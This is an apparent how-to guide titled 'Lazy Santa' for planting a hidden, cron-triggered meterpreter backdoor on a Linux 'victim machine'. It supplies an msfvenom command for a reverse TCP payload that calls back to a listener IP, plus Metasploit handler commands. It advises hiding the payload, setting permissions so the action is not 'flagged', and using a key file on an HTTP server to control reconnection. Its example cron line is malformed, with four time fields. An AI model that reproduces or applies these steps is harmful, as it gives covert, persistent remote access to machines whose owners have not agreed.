# Lazy Santa

## Setting up the Payload

to make things nice and easy, we will be setting up a meterpreter right from the get go.  I have included an example payload, but you can make modifications as you see fit.  

```
msfvenom -p linux/x86/meterpreter_reverse_tcp lhost=192.168.98.160 lport=4444 -f elf -o coming_home.elf
```
Obviously you will need to change the `lhost` other than that it should work out of the box. 


## Setting up Metasploit

In metasploit run the following commands individually:

```
use exploit/multi/handler
```
```
set payload linux/x86/meterpreter_reverse_tcp
```

Once all the options are tweaked for your set up use
```
run 
```
or
```
exploit
```
to get everything in motion.  Now at this point you will just be waiting for the call home from the victim machine.

Remember that if you want to re-establish the connection you will need to leave the "key file" in the http server that you specified in the cron job.  If you don't want the victim to try and reconnect then make sure that you remove the key file or stop the http server to cause an other than `200` HTTP response code.  


## Getting the Victim Machine Ready

### The Payload 

The first thing you will need to do is get the payload on the victim machine.  Once you have done that you will need to make sure that is can be executed.  The best way to do this is you use the `u+x` chmod flag.  Otherwise you may be prompted for a sudo password.  By only making the current user be able to run it we can avoid that action getting denied and flagged.  

Use this: 
```
chmod u+x [file_name]
```

Next hide this payload somewhere where it will not be stumbled uppon unless someone is looking for it.  Be sure to specify the file path in the script that the cron job will call.  You could also hide the script that the cron job calls in the same location as the payload.  

### The Cron Job

Essentially we are creating a login bomb.  When certain criteria are met then a meterpeter session is opened. As such, you could theoretically set the shell up around any trigger but for ease we will use cron to just check in periodically.  

For adding this all to the cron tab I have found to have the best success using ssh instead of dropping into a shell from meterpreter.  There are definitely other ways, but if it works....

Also, I rarely try and set up cron jobs by hand.  Take it easy on yourself and use a cron job calculator to get everything just right.  Besides, you may only have one shot to get this right before your window of oppurtunity closes. Nailed it the first time. [This site is useful for that purpose.](https://crontab.guru/)

Though if you just want this to run every minute it is pretty easy to remember:

```
* * * * /path/to/file/
```

That is pretty much it.  Once the cron job is set then it will check at the specified time if the remote resource is available.  If it is, then it open the meterpreter session.  If not, then it waits until the next time, working on a loop until the logic is met.








